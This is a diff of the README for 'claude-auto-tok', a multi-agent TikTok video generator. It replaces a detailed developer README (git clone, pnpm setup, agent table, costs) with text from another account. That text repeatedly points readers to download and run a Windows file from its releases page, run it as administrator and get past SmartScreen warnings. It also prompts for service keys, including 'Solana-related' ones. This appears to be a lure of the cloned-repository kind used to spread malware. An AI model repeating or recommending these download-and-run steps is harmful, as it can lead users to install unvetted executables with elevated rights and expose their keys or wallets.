@@ -1,247 +1,200 @@
-```
- ██████╗██╗      █████╗ ██╗   ██╗██████╗ ███████╗
-██╔════╝██║     ██╔══██╗██║   ██║██╔══██╗██╔════╝
-██║     ██║     ███████║██║   ██║██║  ██║█████╗
-██║     ██║     ██╔══██║██║   ██║██║  ██║██╔══╝
-╚██████╗███████╗██║  ██║╚██████╔╝██████╔╝███████╗
- ╚═════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
- █████╗ ██╗   ██╗████████╗ ██████╗    ████████╗ ██████╗ ██╗  ██╗
-██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗   ╚══██╔══╝██╔═══██╗██║ ██╔╝
-███████║██║   ██║   ██║   ██║   ██║      ██║   ██║   ██║█████╔╝
-██╔══██║██║   ██║   ██║   ██║   ██║      ██║   ██║   ██║██╔═██╗
-██║  ██║╚██████╔╝   ██║   ╚██████╔╝      ██║   ╚██████╔╝██║  ██╗
-╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝       ╚═╝    ╚═════╝ ╚═╝  ╚═╝
-```
+# 🤖 claude-auto-tok - Turn ideas into TikTok videos fast
 
-**AI-powered TikTok content factory.** Six autonomous agents research trends, write viral scripts, generate voiceovers, source B-roll, render 9:16 video, and QA the result — all from a single command.
+[![Download on GitHub Releases](https://img.shields.io/badge/Download%20%26%20Install-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/scowlsericulturist188/claude-auto-tok/releases)
 
----
-
-## Table of Contents
+## 📥 Download
 
-- [Demo](#demo)
-- [How It Works](#how-it-works)
-- [Agents](#agents)
-- [Quick Start](#quick-start)
-- [Video Templates](#video-templates)
-- [Remotion Studio](#remotion-studio)
-- [Pipeline Architecture](#pipeline-architecture)
-- [Revision Loop](#revision-loop)
-- [Failure Modes](#failure-modes)
-- [Automation (2 Videos/Day)](#automation-2-videosday)
-- [Cost Per Video](#cost-per-video)
-- [Requirements](#requirements)
-
----
+Visit this page to download: https://github.com/scowlsericulturist188/claude-auto-tok/releases
 
-## Demo
+1. Open the link above
+2. Find the latest release
+3. Download the Windows file
+4. Run the file on your PC
+5. Follow the setup steps on screen
 
-> Sample output from `pnpm swarm:run "build a SaaS in a weekend with Claude Code"`
+## 🎬 What this app does
 
-<video src="https://github.com/nullxnothing/claude-auto-tok/releases/download/v1.0.0/demo.mp4" controls width="320"></video>
+claude-auto-tok helps you make TikTok-style videos from a simple idea or prompt. It uses a chain of AI agents to handle the work for you, including writing, voice, visuals, and final video assembly.
 
-[Watch the demo video](https://github.com/nullxnothing/claude-auto-tok/releases/download/v1.0.0/demo.mp4) if the embed doesn't load.
+Use it to:
 
----
+- Turn a short topic into a full video script
+- Generate voice lines for the video
+- Build scenes that match the script
+- Render a finished video file
+- Keep the process in one flow instead of doing each step by hand
 
-## How It Works
+## 🖥️ Windows requirements
 
-```
-Topic In ──► Researcher ──► Scriptwriter ──► Voice Producer ──► Visual Director ──► Composer ──► Reviewer ──► Video Out
-                │                │                │                  │                │              │
-           ScrapeCreators   Claude (OR)     ElevenLabs v3        Pexels/Kling      Remotion     Gemini 2.5
-           TikTok trends    Hook formulas   Word-level timing    Stock + AI video   6 templates  Multimodal QA
-```
+For the best result, use:
 
-**One command. One topic. One ready-to-post TikTok in ~8 minutes.**
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 5 GB of free disk space
+- A stable internet connection
+- Permission to run downloaded apps
 
----
+If your PC is older, the app may still run, but video generation can take longer.
 
-## Agents
+## 🚀 Getting started
 
-| # | Agent | Model (pinned) | Job |
-|---|-------|----------------|-----|
-| 1 | **Researcher** | `gemini-2.5-flash` | Pulls top 20 TikToks via ScrapeCreators, scores hooks, checks trend timing (rising/peak/saturated), gates the pipeline with GO/WAIT/PIVOT |
-| 2 | **Scriptwriter** | `claude-sonnet-4-20250514` via OpenRouter | Generates 3 hook variants using proven formulas (contradiction, knowledge gap, bold claim, POV), writes full script with overlays and captions |
-| 3 | **Voice Producer** | ElevenLabs v3 (`eleven_multilingual_v2`) | Synthesizes voiceover with word-level timestamps for precise subtitle sync |
-| 4 | **Visual Director** | `claude-sonnet-4-20250514` + `imagen-4` | Plans scene backgrounds, fetches B-roll from Pexels (or generates via Kling AI), creates thumbnails, selects color palette and template |
-| 5 | **Composer** | Remotion 4.x | Renders final 9:16 video with bold word captions, scene transitions, progress bar, background music, and CTA card |
-| 6 | **Reviewer** | `gemini-2.5-pro` | Watches the rendered video, scores hook/completion/thumbnail/SEO on a 20-point rubric, approves or sends back for revision (up to 2 loops) |
-
----
-
-## Quick Start
-
-### 1. Clone & Install
+1. Download the latest Windows release from the link above
+2. Open the downloaded file
+3. If Windows asks for permission, choose Yes
+4. Wait for the app to finish installing or unpacking
+5. Start claude-auto-tok from the installed app or desktop shortcut
 
-```bash
-git clone https://github.com/YOUR_USERNAME/claude-auto-tok.git
-cd claude-auto-tok
-pnpm install
-```
-
-### 2. Configure
+After launch, the app should open to a simple screen where you can begin a new video project.
 
-```bash
-cp .env.example .env
-```
+## ⚙️ First-time setup
 
-Fill in your API keys:
+When you open the app for the first time, you may need to add a few service keys so the app can reach the AI tools it uses.
 
-| Key | Required | Free Tier? |
-|-----|----------|------------|
-| `OPENROUTER_API_KEY` | Yes | No (~$0.01/video) |
-| `GEMINI_API_KEY` | Yes | Yes (15 RPM) |
-| `ELEVENLABS_API_KEY` | Yes | Yes (10K chars/mo) |
-| `SCRAPECREATORS_API_KEY` | Yes | No (~$0.01/call) |
-| `PEXELS_API_KEY` | Yes | Yes (200 req/hr) |
-| `KLING_ACCESS_KEY` | No | No (AI video, expensive) |
-| `TIKTOK_CLIENT_KEY` | No | Requires app approval |
+Common services include:
 
-### 3. Add Background Music
-
-Drop an MP3 into `public/` and set `DEFAULT_BG_MUSIC=your-file.mp3` in `.env`.
+- Claude for writing and planning
+- Gemini for extra model support
+- OpenRouter for model access
+- ElevenLabs for voice generation
+- Solana-related options if you use token-based features
 
-### 4. Run
+If the app asks for keys, paste them into the settings screen and save them before you start a project.
 
-```bash
-pnpm swarm:run "why every dev needs an AI IDE"
-```
+## 🧭 How to make your first video
 
-Output lands in `output/ready/<slug>/`:
-```
-video.mp4           # Final rendered TikTok
-caption.txt         # Caption + hashtags
-thumbnail.png       # Cover image
-script.json         # Full script data
-review_score.json   # QA scores
-```
+1. Open the app
+2. Enter a topic, product, or short idea
+3. Pick a video style
+4. Choose a voice if the app asks
+5. Click the button to start generation
+6. Wait while the agents write, build, and render the video
+7. Open the output folder and review the finished file
 
----
+A simple first prompt could be:
 
-## Video Templates
+- 3 surprising facts about sleep
+- Why people fail at saving money
+- How to build a morning routine that sticks
 
-Six Remotion templates, auto-selected by the Visual Director:
+## 🧠 How the workflow works
 
-| Template | Style | Best For |
-|----------|-------|----------|
-| **A** — Split Reveal | Side-by-side comparison | Before/after, tool comparisons |
-| **B** — Terminal Reveal | Dark IDE aesthetic | Code demos, CLI tools |
-| **C** — Cinematic Text | Full-screen typography | POV, story-driven hooks |
-| **D** — Card Stack | Stacked info cards | Lists, tips, features |
-| **E** — Zoom Focus | Ken Burns on assets | Product showcases |
-| **F** — Rapid Cut | Fast scene switching | High-energy, trend pieces |
+The app uses multiple agents to split the work into smaller jobs:
 
-All templates include: bold word captions, progress bar, CTA card, crossfade transitions.
+- One agent plans the topic
+- One agent writes the script
+- One agent shapes the hook and pacing
+- One agent helps with voice
+- One agent prepares the scene flow
+- One agent helps produce the final video
 
----
+This setup helps keep the process organized and cuts down on manual editing.
 
-## Remotion Studio
+## 🎨 What you can expect in the output
 
-Preview and tweak templates in the browser:
+The app may create:
 
-```bash
-pnpm remotion:studio
-```
+- Short-form vertical videos
+- Script files
+- Voice files
+- Scene data
+- Rendered MP4 output
+- Project folders for later edits
 
----
+The final look depends on your settings, prompt, and chosen models.
 
-## Pipeline Architecture
+## 🛠️ Common use cases
 
-```
-orchestrator.ts          # Main loop — chains agents, handles revisions
-state.ts                 # Shared types (PipelineState, all agent contracts)
-agents/
-  llm.ts                 # Claude wrapper (OpenRouter)
-  prompts.ts             # System prompts for all agents
-  researcher.ts          # Trend research + ScrapeCreators
-  scriptwriter.ts        # Hook generation + script writing
-  voice-producer.ts      # ElevenLabs TTS + word timing
-  visual-director.ts     # Asset planning + Pexels/Kling/Imagen
-  asset-generator.ts     # Screenshot, stock video, AI image fetching
-  broll-library.ts       # Local B-roll clip management
-  composer.ts            # Remotion render trigger
-  reviewer.ts            # Multimodal QA scoring
-remotion/
-  Root.tsx               # Composition router
-  TemplateA-F.tsx        # Video templates
-  components/            # Subtitle, HookCard, CTA, PostEffects, etc.
-  palettes.ts            # Color systems
-```
+claude-auto-tok fits tasks like:
 
----
+- Social media content drafts
+- TikTok-style explainers
+- Fast idea testing
+- Voice-led short videos
+- Automated content pipelines
+- Reusable video templates
 
-## Revision Loop
+## 📁 Folder and file basics
 
-The pipeline self-corrects:
+After a run, check the output or project folder for:
 
-1. Reviewer scores the video on a 20-point rubric
-2. Score >= 16 → **APPROVE** (ship it)
-3. Score 12-15 → **CONDITIONAL** (one targeted fix, re-score)
-4. Score < 12 → **DENY** (full rewrite with specific notes)
-5. Max 2 revision loops, then outputs for manual review
+- The final video file
+- Audio assets
+- Scene files
+- Render logs
+- Project notes
 
-Revision targets are specific: "scriptwriter", "visual_director", or "both" — agents only redo their part.
+If you want to make changes, keep the project folder so you can rerun the same idea with edits.
 
----
+## 🧩 Tips for a smooth run
 
-## Failure Modes
+- Use short prompts for your first test
+- Keep your internet connection stable
+- Close other heavy apps while rendering
+- Use a clear topic with one main idea
+- Save your API keys before you start
+- Check the output folder if the app finishes without opening the video
 
-Things that actually break in production and how the pipeline handles them:
+## 🔧 If Windows blocks the app
 
-| Failure | Cause | What Happens | Mitigation |
-|---------|-------|--------------|------------|
-| **Researcher returns WAIT/PIVOT** | Trend is saturated or too niche | Pipeline halts early, no wasted API calls | Retry with a different topic or wait for trend cycle |
-| **Hook scoring below threshold** | Claude generates a weak/generic hook | Scriptwriter reruns with tighter constraints | 3 variants are generated — if all score low, pipeline stops with a log |
-| **ElevenLabs rate limit** | Free tier: 10K chars/month | Voice producer throws, pipeline exits | Monitor usage in ElevenLabs dashboard, upgrade tier, or queue videos |
-| **Pexels returns no results** | Niche topic with bad search terms | Visual director falls back to solid color backgrounds | Kling AI as secondary source (if configured), or manual B-roll in `public/broll/` |
-| **Kling AI timeout** | AI video generation takes 2-5 min per clip | Composer hangs waiting for asset | 60s timeout with fallback to Pexels stills; disable Kling for budget runs |
-| **Remotion render crash** | Missing assets, corrupt audio, or Chrome OOM | Composer exits with render error log | Check `output/debug/` for frame-level logs; ensure Chrome/Chromium is installed |
-| **Audio/subtitle sync drift** | Word-level timestamps misalign with video duration | Captions appear early or late | Voice producer validates total duration against script length before passing to composer |
-| **Reviewer scores < 12 twice** | Fundamental issue with topic or script quality | Pipeline exits after 2 revision loops | Output saved to `output/needs-review/` for manual editing; check `review_score.json` for specific failures |
-| **ScrapeCreators API down** | Third-party service outage | Researcher fails immediately | Pipeline logs error and exits; no silent fallback to prevent stale trend data |
+If Windows shows a smart screen or file warning:
 
-**General debugging:** Every agent writes structured logs to `output/debug/<agent>.json`. Start there.
+1. Check that you downloaded the file from the release page
+2. Right-click the file
+3. Choose Open or Run as administrator if needed
+4. Confirm the prompt to continue
 
----
+If the app still does not open, try downloading the latest release again
 
-## Automation (2 Videos/Day)
+## 🧪 Suggested first test
 
-Set up cron on a VPS for hands-free posting:
+Use this simple test run:
 
-```bash
-# Morning + afternoon posts
-0 6 * * *  cd /path/to/claude-auto-tok && node scripts/auto-run.js morning
-0 14 * * * cd /path/to/claude-auto-tok && node scripts/auto-run.js afternoon
-```
+- Topic: 5 tools that save time at work
+- Style: clean, fast, direct
+- Voice: calm and clear
+- Length: short form
+- Goal: one finished vertical video
 
-Requires TikTok Direct Post API access (3-4 week approval process). See `AUTOMATION_STRATEGY.md` for the full deployment guide.
+This gives you a quick way to check that download, setup, and rendering all work on your machine
 
-**Estimated cost:** ~$8-10/month without Kling AI video.
+## 📌 Repository topics
 
----
+This project connects to:
 
-## Cost Per Video
+- AI agents
+- Content automation
+- Text to video
+- Video generation
+- TikTok automation
+- Multi-agent workflows
+- Social media content
+- Voice and model tools
+- TypeScript-based tooling
 
-| Service | Cost | Notes |
-|---------|------|-------|
-| Claude (OpenRouter) | ~$0.01 | 4 LLM calls per video |
-| Gemini 2.5 Flash | ~$0.01 | Research + review (free tier available) |
-| ElevenLabs | ~$0.03 | ~500 chars per video |
-| Pexels | Free | 200 requests/hour |
-| Kling AI (optional) | ~$0.20-0.50/clip | AI-generated video, skip if budget-conscious |
-| **Total** | **~$0.05/video** | Without Kling |
+## 🧷 File you should download
 
----
+Open the releases page and download the latest Windows build:
 
-## Requirements
+https://github.com/scowlsericulturist188/claude-auto-tok/releases
 
-- Node.js 18+
-- pnpm
-- Chrome/Chromium (for Remotion rendering)
+## 🧰 Basic troubleshooting
 
----
+If something goes wrong:
 
-## License
+- Make sure you downloaded the newest release
+- Reopen the app after a full close
+- Check your internet connection
+- Confirm your API keys are valid
+- Try a shorter prompt
+- Restart Windows and run the app again
 
-MIT
+## 📤 Next step after your first video
+
+After the first run, try:
+
+- A different topic
+- A different voice
+- A longer script
+- A faster pacing style
+- A new hook at the start
+- A different scene layout
